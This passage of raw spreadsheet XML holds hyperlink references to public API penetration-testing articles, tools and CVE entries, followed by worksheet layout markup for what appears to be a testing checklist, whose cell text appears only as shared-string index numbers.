Target="https://wesecureapp.com/blog/the-only-api-penetration-testing-checklist-you-need/" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://pentesterlab.com/glossary/graphql-batching-attack" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://lab.wallarm.com/graphql-batching-attack-2/" TargetMode="External"/><Relationship Id="rId39" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.resecurity.com/blog/article/ssrf-to-aws-metadata-exposure-how-attackers-steal-cloud-credentials" TargetMode="External"/><Relationship Id="rId40" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://danaepp.com/an-api-security-testing-checklist-with-a-twist" TargetMode="External"/><Relationship Id="rId41" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://danaepp.com/weaponizing-api-discovery-metadata" TargetMode="External"/><Relationship Id="rId42" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/intruder-io/autoswagger" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/assetnote/kiterunner" TargetMode="External"/><Relationship Id="rId44" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/nikitastupin/clairvoyance" TargetMode="External"/><Relationship Id="rId45" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/doyensec/inql" TargetMode="External"/><Relationship Id="rId46" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/ticarpi/jwt_tool" TargetMode="External"/><Relationship Id="rId47" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/nxenon/grpc-pentest-suite" TargetMode="External"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/arainho/awesome-api-security" TargetMode="External"/><Relationship Id="rId49" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/xaferima/API-Pentesting-Checklist" TargetMode="External"/><Relationship Id="rId50" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/shieldfy/API-Security-Checklist" TargetMode="External"/><Relationship Id="rId51" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/riteshs4hu/API-Pentesting-Resources" TargetMode="External"/><Relationship Id="rId52" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/portswigger/http-request-smuggler" TargetMode="External"/><Relationship Id="rId53" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/detail/CVE-2023-44487" TargetMode="External"/><Relationship Id="rId54" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://github.com/advisories/GHSA-prj3-ccx8-p6x4" TargetMode="External"/><Relationship Id="rId55" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://arxiv.org/abs/2207.11171" TargetMode="External"/><Relationship Id="rId56" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.veracode.com/blog/breaking-down-owasp-top-10-api-security-risks-2023-what-changed-2019/" TargetMode="External"/><Relationship Id="rId57" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://imagetragick.com/" TargetMode="External"/><Relationship Id="rId58" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portswigger.net/web-security/request-smuggling/browser/cl-0" TargetMode="External"/><Relationship Id="rId59" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/" TargetMode="External"/><Relationship Id="rId60" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://snyk.io/research/zip-slip-vulnerability" TargetMode="External"/><Relationship Id="rId61" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.vaadata.com/en/blog/api-penetration-testing-objective-methodology-black-box-grey-box-and-white-box-tests/" TargetMode="External"/><Relationship Id="rId62" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.stackhawk.com/blog/best-practices-for-grpc-security/" TargetMode="External"/><Relationship Id="rId63" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://clear-gate.com/blog/websocket-misconfigurations" TargetMode="External"/><Relationship Id="rId64" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/detail/CVE-2025-32094" TargetMode="External"/><Relationship Id="rId65" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://nvd.nist.gov/vuln/detail/CVE-2025-436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8" min="2" style="0" width="22"/>
  </cols>
  <sheetData>
    <row r="2" customFormat="false" ht="24.45"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15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="B5" s="3" t="s">
        <v>2</v>
      </c>
      <c r="C5" s="3"/>
      <c r="D5" s="3"/>
      <c r="E5" s="3"/>
      <c r="F5" s="3"/>
      <c r="G5" s="3"/>
      <c r="H5" s="3"/>
    </row>
    <row r="6" customFormat="false" ht="31.5" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B6" s="4" t="s">
        <v>3</v>
      </c>
      <c r="C6" s="4"/>
      <c r="D6" s="4"/>
      <c r="E6" s="4"/>
      <c r="F6" s="4"/>
      <c r="G6" s="4"/>
      <c r="H6" s="4"/>
    </row>
    <row r="7" customFormat="false" ht="31.5" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B7" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C7" s="4"/>
      <c r="D7" s="4"/>
      <c r="E7" s="4"/>
      <c r="F7" s="4"/>
      <c r="G7" s="4"/>
      <c r="H7" s="4"/>
    </row>
    <row r="8" customFormat="false" ht="31.5" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B8" s="4" t="s">
        <v>5</v>
      </c>
      <c r="C8" s="4"/>
      <c r="D8" s="4"/>
      <c r="E8" s="4"/>
      <c r="F8" s="4"/>
      <c r="G8" s="4"/>
      <c r="H8" s="4"/>
    </row>
    <row r="9" customFormat="false" ht="31.5" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B9" s="4" t="s">
        <v>6</v>
      </c>
      <c r="C9" s="4"/>
      <c r="D9" s="4"/>
      <c r="E9" s="4"/>
      <c r="F9" s="4"/>
      <c r="G9" s="4"/>
      <c r="H9" s="4"/>
    </row>
    <row r="10" customFormat="false" ht="31.5" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B10" s="4" t="s">
        <v>7</v>
      </c>
      <c r="C10" s="4"/>
      <c r="D10" s="4"/>
      <c r="E10" s="4"/>
      <c r="F10" s="4"/>
      <c r="G10" s="4"/>
      <c r="H10" s="4"/>
    </row>
    <row r="12" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="B12" s="3" t="s">
        <v>8</v>
      </c>
      <c r="C12" s="3"/>
      <c r="D12" s="3"/>
      <c r="E12" s="3"/>
      <c r="F12" s="3"/>
      <c r="G12" s="3"/>
      <c r="H12" s="3"/>
    </row>
    <row r="13" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B13" s="4" t="s">
        <v>9</v>
      </c>
      <c r="C13" s="4"/>
      <c r="D13" s="4"/>
      <c r="E13" s="4"/>
      <c r="F13" s="4"/>
      <c r="G13" s="4"/>
      <c r="H13" s="4"/>
    </row>
    <row r="14" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B14" s="4" t="s">
        <v>10</v>
      </c>
      <c r="C14" s="4"/>
      <c r="D14" s="4"/>
      <c r="E14" s="4"/>
      <c r="F14" s="4"/>
      <c r="G14" s="4"/>
      <c r="H14" s="4"/>
    </row>
    <row r="15" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B15" s="4" t="s">
        <v>11</v>
      </c>
      <c r="C15" s="4"/>
      <c r="D15" s="4"/>
      <c r="E15" s="4"/>
      <c r="F15" s="4"/>
      <c r="G15" s="4"/>
      <c r="H15" s="4"/>
    </row>
    <row r="16" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B16" s="4" t="s">
        <v>12</v>
      </c>
      <c r="C16" s="4"/>
      <c r="D16" s="4"/>
      <c r="E16" s="4"/>
      <c r="F16" s="4"/>
      <c r="G16" s="4"/>
      <c r="H16" s="4"/>
    </row>
    <row r="17" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B17" s="4" t="s">
        <v>13</v>
      </c>
      <c r="C17" s="4"/>
      <c r="D17" s="4"/>
      <c r="E17" s="4"/>
      <c r="F17" s="4"/>
      <c r="G17" s="4"/>
      <c r="H17" s="4"/>
    </row>
    <row r="18" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B18" s="4" t="s">
        <v>14</v>
      </c>
      <c r="C18" s="4"/>
      <c r="D18" s="4"/>
      <c r="E18" s="4"/>
      <c r="F18" s="4"/>
      <c r="G18" s="4"/>
      <c r="H18" s="4"/>
    </row>
    <row r="20" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="B20" s="3" t="s">
        <v>15</v>
      </c>
      <c r="C20" s="3"/>
      <c r="D20" s="3"/>
      <c r="E20" s="3"/>
      <c r="F20" s="3"/>
      <c r="G20" s="3"/>
      <c r="H20" s="3"/>
    </row>
    <row r="21" customFormat="false" ht="18" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B21" s="5" t="s">
        <v>16</v>
      </c>
    </row>
    <row r="22" customFormat="false" ht="18" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B22" s="6" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="23" customFormat="false" ht="18" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B23" s="7" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="24" customFormat="false" ht="18" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B24" s="8" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="25" customFormat="false" ht="18" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B25" s="9" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="27" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="B27" s="3" t="s">
        <v>21</v>
      </c>
      <c r="C27" s="3"/>
      <c r="D27" s="3"/>
      <c r="E27" s="3"/>
      <c r="F27" s="3"/>
      <c r="G27" s="3"/>
      <c r="H27" s="3"/>
    </row>
    <row r="28" customFormat="false" ht="15" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="B28" s="4" t="s">
        <v>22</v>
      </c>
      <c r="C28" s="4"/>
      <c r="D28" s="4"/>
      <c r="E28" s="4"/>
      <c r="F28" s="4"/>
      <c r="G28" s="4"/>
      <c r="H28" s="4"/>
    </row>
    <row r="29" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="B29" s="4"/>
      <c r="C29" s="4"/>
      <c r="D29" s="4"/>
      <c r="E29" s="4"/>
      <c r="F29" s="4"/>
      <c r="G29" s="4"/>
      <c r="H29" s="4"/>
    </row>
    <row r="30" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="B30" s="4"/>
      <c r="C30" s="4"/>
      <c r="D30" s="4"/>
      <c r="E30" s="4"/>
      <c r="F30" s="4"/>
      <c r="G30" s="4"/>
      <c r="H30" s="4"/>
    </row>
  </sheetData>
  <mergeCells count="18">
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="B3:H3"/>
    <mergeCell ref="B5:H5"/>
    <mergeCell ref="B6:H6"/>
    <mergeCell ref="B7:H7"/>
    <mergeCell ref="B8:H8"/>
    <mergeCell ref="B9:H9"/>
    <mergeCell ref="B10:H10"/>
    <mergeCell ref="B12:H12"/>
    <mergeCell ref="B13:H13"/>
    <mergeCell ref="B14:H14"/>
    <mergeCell ref="B15:H15"/>
    <mergeCell ref="B16:H16"/>
    <mergeCell ref="B17:H17"/>
    <mergeCell ref="B18:H18"/>
    <mergeCell ref="B20:H20"/>
    <mergeCell ref="B27:H27"/>
    <mergeCell ref="B28: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42"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="4" min="4" style="0" width="70"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="5" min="5" style="0" width="60"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="6" min="6" style="0" width="50"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="7" min="7" style="0" width="12"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="8" min="8" style="0" width="14"/>
    <col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="9" min="9" style="0" width="30"/>
  </cols>
  <sheetData>
    <row r="1" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A1" s="1" t="s">
        <v>23</v>
      </c>
      <c r="B1" s="1"/>
      <c r="C1" s="1"/>
      <c r="D1" s="1"/>
      <c r="E1" s="1"/>
      <c r="F1" s="1"/>
      <c r="G1" s="1"/>
      <c r="H1" s="1"/>
      <c r="I1" s="1"/>
    </row>
    <row r="2" customFormat="false" ht="15" hidden="false" customHeight="false" outlineLevel="0" collapsed="false">
      <c r="A2" s="10" t="s">
        <v>24</v>
      </c>
      <c r="B2" s="10"/>
      <c r="C2" s="10"/>
      <c r="D2" s="10"/>
      <c r="E2" s="10"/>
      <c r="F2" s="10"/>
      <c r="G2" s="10"/>
      <c r="H2" s="10"/>
      <c r="I2" s="10"/>
    </row>
    <row r="3" customFormat="false" ht="27.75" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A3" s="11" t="s">
        <v>25</v>
      </c>
      <c r="B3" s="11" t="s">
        <v>26</v>
      </c>
      <c r="C3" s="11" t="s">
        <v>27</v>
      </c>
      <c r="D3" s="11" t="s">
        <v>28</v>
      </c>
      <c r="E3" s="11" t="s">
        <v>29</v>
      </c>
      <c r="F3" s="11" t="s">
        <v>30</v>
      </c>
      <c r="G3" s="11" t="s">
        <v>31</v>
      </c>
      <c r="H3" s="11" t="s">
        <v>32</v>
      </c>
      <c r="I3" s="11" t="s">
        <v>33</v>
      </c>
    </row>
    <row r="4" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A4" s="12" t="s">
        <v>34</v>
      </c>
      <c r="B4" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C4" s="13" t="s">
        <v>36</v>
      </c>
      <c r="D4" s="13" t="s">
        <v>37</v>
      </c>
      <c r="E4" s="13" t="s">
        <v>38</v>
      </c>
      <c r="F4" s="13" t="s">
        <v>39</v>
      </c>
      <c r="G4" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H4" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I4" s="13"/>
    </row>
    <row r="5" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A5" s="12" t="s">
        <v>41</v>
      </c>
      <c r="B5" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C5" s="13" t="s">
        <v>42</v>
      </c>
      <c r="D5" s="13" t="s">
        <v>43</v>
      </c>
      <c r="E5" s="13" t="s">
        <v>44</v>
      </c>
      <c r="F5" s="13" t="s">
        <v>45</v>
      </c>
      <c r="G5" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H5" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I5" s="13"/>
    </row>
    <row r="6" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A6" s="12" t="s">
        <v>46</v>
      </c>
      <c r="B6" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C6" s="13" t="s">
        <v>47</v>
      </c>
      <c r="D6" s="13" t="s">
        <v>48</v>
      </c>
      <c r="E6" s="13" t="s">
        <v>49</v>
      </c>
      <c r="F6" s="13" t="s">
        <v>50</v>
      </c>
      <c r="G6" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H6" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I6" s="13"/>
    </row>
    <row r="7" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A7" s="12" t="s">
        <v>51</v>
      </c>
      <c r="B7" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C7" s="13" t="s">
        <v>52</v>
      </c>
      <c r="D7" s="13" t="s">
        <v>53</v>
      </c>
      <c r="E7" s="13" t="s">
        <v>54</v>
      </c>
      <c r="F7" s="13" t="s">
        <v>55</v>
      </c>
      <c r="G7" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H7" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I7" s="13"/>
    </row>
    <row r="8" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A8" s="12" t="s">
        <v>56</v>
      </c>
      <c r="B8" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C8" s="13" t="s">
        <v>57</v>
      </c>
      <c r="D8" s="13" t="s">
        <v>58</v>
      </c>
      <c r="E8" s="13" t="s">
        <v>59</v>
      </c>
      <c r="F8" s="13" t="s">
        <v>60</v>
      </c>
      <c r="G8" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H8" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I8" s="13"/>
    </row>
    <row r="9" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A9" s="12" t="s">
        <v>61</v>
      </c>
      <c r="B9" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C9" s="13" t="s">
        <v>62</v>
      </c>
      <c r="D9" s="13" t="s">
        <v>63</v>
      </c>
      <c r="E9" s="13" t="s">
        <v>64</v>
      </c>
      <c r="F9" s="13" t="s">
        <v>65</v>
      </c>
      <c r="G9" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H9" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I9" s="13"/>
    </row>
    <row r="10" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A10" s="12" t="s">
        <v>66</v>
      </c>
      <c r="B10" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C10" s="13" t="s">
        <v>67</v>
      </c>
      <c r="D10" s="13" t="s">
        <v>68</v>
      </c>
      <c r="E10" s="13" t="s">
        <v>69</v>
      </c>
      <c r="F10" s="13" t="s">
        <v>70</v>
      </c>
      <c r="G10" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H10" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I10" s="13"/>
    </row>
    <row r="11" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A11" s="12" t="s">
        <v>71</v>
      </c>
      <c r="B11" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C11" s="13" t="s">
        <v>72</v>
      </c>
      <c r="D11" s="13" t="s">
        <v>73</v>
      </c>
      <c r="E11" s="13" t="s">
        <v>74</v>
      </c>
      <c r="F11" s="13" t="s">
        <v>75</v>
      </c>
      <c r="G11" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H11" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I11" s="13"/>
    </row>
    <row r="12" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A12" s="12" t="s">
        <v>76</v>
      </c>
      <c r="B12" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C12" s="13" t="s">
        <v>77</v>
      </c>
      <c r="D12" s="13" t="s">
        <v>78</v>
      </c>
      <c r="E12" s="13" t="s">
        <v>79</v>
      </c>
      <c r="F12" s="13" t="s">
        <v>80</v>
      </c>
      <c r="G12" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H12" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I12" s="13"/>
    </row>
    <row r="13" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A13" s="12" t="s">
        <v>81</v>
      </c>
      <c r="B13" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C13" s="13" t="s">
        <v>82</v>
      </c>
      <c r="D13" s="13" t="s">
        <v>83</v>
      </c>
      <c r="E13" s="13" t="s">
        <v>84</v>
      </c>
      <c r="F13" s="13" t="s">
        <v>85</v>
      </c>
      <c r="G13" s="14" t="s">
        <v>17</v>
      </c>
      <c r="H13" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I13" s="13"/>
    </row>
    <row r="14" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A14" s="12" t="s">
        <v>86</v>
      </c>
      <c r="B14" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C14" s="13" t="s">
        <v>87</v>
      </c>
      <c r="D14" s="13" t="s">
        <v>88</v>
      </c>
      <c r="E14" s="13" t="s">
        <v>89</v>
      </c>
      <c r="F14" s="13" t="s">
        <v>90</v>
      </c>
      <c r="G14" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H14" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I14" s="13"/>
    </row>
    <row r="15" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A15" s="12" t="s">
        <v>91</v>
      </c>
      <c r="B15" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C15" s="13" t="s">
        <v>92</v>
      </c>
      <c r="D15" s="13" t="s">
        <v>93</v>
      </c>
      <c r="E15" s="13" t="s">
        <v>94</v>
      </c>
      <c r="F15" s="13" t="s">
        <v>95</v>
      </c>
      <c r="G15" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H15" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I15" s="13"/>
    </row>
    <row r="16" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A16" s="12" t="s">
        <v>96</v>
      </c>
      <c r="B16" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C16" s="13" t="s">
        <v>97</v>
      </c>
      <c r="D16" s="13" t="s">
        <v>98</v>
      </c>
      <c r="E16" s="13" t="s">
        <v>99</v>
      </c>
      <c r="F16" s="13" t="s">
        <v>100</v>
      </c>
      <c r="G16" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H16" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I16" s="13"/>
    </row>
    <row r="17" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A17" s="12" t="s">
        <v>101</v>
      </c>
      <c r="B17" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C17" s="13" t="s">
        <v>102</v>
      </c>
      <c r="D17" s="13" t="s">
        <v>103</v>
      </c>
      <c r="E17" s="13" t="s">
        <v>104</v>
      </c>
      <c r="F17" s="13" t="s">
        <v>105</v>
      </c>
      <c r="G17" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H17" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I17" s="13"/>
    </row>
    <row r="18" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A18" s="12" t="s">
        <v>106</v>
      </c>
      <c r="B18" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C18" s="13" t="s">
        <v>107</v>
      </c>
      <c r="D18" s="13" t="s">
        <v>108</v>
      </c>
      <c r="E18" s="13" t="s">
        <v>109</v>
      </c>
      <c r="F18" s="13" t="s">
        <v>110</v>
      </c>
      <c r="G18" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H18" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I18" s="13"/>
    </row>
    <row r="19" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A19" s="12" t="s">
        <v>111</v>
      </c>
      <c r="B19" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C19" s="13" t="s">
        <v>112</v>
      </c>
      <c r="D19" s="13" t="s">
        <v>113</v>
      </c>
      <c r="E19" s="13" t="s">
        <v>114</v>
      </c>
      <c r="F19" s="13" t="s">
        <v>115</v>
      </c>
      <c r="G19" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H19" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I19" s="13"/>
    </row>
    <row r="20" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A20" s="12" t="s">
        <v>116</v>
      </c>
      <c r="B20" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C20" s="13" t="s">
        <v>117</v>
      </c>
      <c r="D20" s="13" t="s">
        <v>118</v>
      </c>
      <c r="E20" s="13" t="s">
        <v>119</v>
      </c>
      <c r="F20" s="13" t="s">
        <v>120</v>
      </c>
      <c r="G20" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H20" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I20" s="13"/>
    </row>
    <row r="21" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A21" s="12" t="s">
        <v>121</v>
      </c>
      <c r="B21" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C21" s="13" t="s">
        <v>122</v>
      </c>
      <c r="D21" s="13" t="s">
        <v>123</v>
      </c>
      <c r="E21" s="13" t="s">
        <v>124</v>
      </c>
      <c r="F21" s="13" t="s">
        <v>125</v>
      </c>
      <c r="G21" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H21" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I21" s="13"/>
    </row>
    <row r="22" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A22" s="12" t="s">
        <v>126</v>
      </c>
      <c r="B22" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C22" s="13" t="s">
        <v>127</v>
      </c>
      <c r="D22" s="13" t="s">
        <v>128</v>
      </c>
      <c r="E22" s="13" t="s">
        <v>129</v>
      </c>
      <c r="F22" s="13" t="s">
        <v>130</v>
      </c>
      <c r="G22" s="15" t="s">
        <v>20</v>
      </c>
      <c r="H22" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I22" s="13"/>
    </row>
    <row r="23" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A23" s="12" t="s">
        <v>131</v>
      </c>
      <c r="B23" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C23" s="13" t="s">
        <v>132</v>
      </c>
      <c r="D23" s="13" t="s">
        <v>133</v>
      </c>
      <c r="E23" s="13" t="s">
        <v>134</v>
      </c>
      <c r="F23" s="13" t="s">
        <v>135</v>
      </c>
      <c r="G23" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H23" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I23" s="13"/>
    </row>
    <row r="24" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A24" s="12" t="s">
        <v>136</v>
      </c>
      <c r="B24" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C24" s="13" t="s">
        <v>137</v>
      </c>
      <c r="D24" s="13" t="s">
        <v>138</v>
      </c>
      <c r="E24" s="13" t="s">
        <v>139</v>
      </c>
      <c r="F24" s="13" t="s">
        <v>140</v>
      </c>
      <c r="G24" s="17" t="s">
        <v>19</v>
      </c>
      <c r="H24" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I24" s="13"/>
    </row>
    <row r="25" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A25" s="12" t="s">
        <v>141</v>
      </c>
      <c r="B25" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C25" s="13" t="s">
        <v>142</v>
      </c>
      <c r="D25" s="13" t="s">
        <v>143</v>
      </c>
      <c r="E25" s="13" t="s">
        <v>144</v>
      </c>
      <c r="F25" s="13" t="s">
        <v>145</v>
      </c>
      <c r="G25" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H25" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I25" s="13"/>
    </row>
    <row r="26" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A26" s="12" t="s">
        <v>146</v>
      </c>
      <c r="B26" s="13" t="s">
        <v>35</v>
      </c>
      <c r="C26" s="13" t="s">
        <v>147</v>
      </c>
      <c r="D26" s="13" t="s">
        <v>148</v>
      </c>
      <c r="E26" s="13" t="s">
        <v>149</v>
      </c>
      <c r="F26" s="13" t="s">
        <v>150</v>
      </c>
      <c r="G26" s="16" t="s">
        <v>18</v>
      </c>
      <c r="H26" s="13" t="s">
        <v>40</v>
      </c>
      <c r="I26" s="13"/>
    </row>
    <row r="27" customFormat="false" ht="90" hidden="false" customHeight="true" outlineLevel="0" collapsed="false">
      <c r="A27" s="12" t="s">
        <v>151</v>
      </c>
      <c r="B27" s="13" t="s">
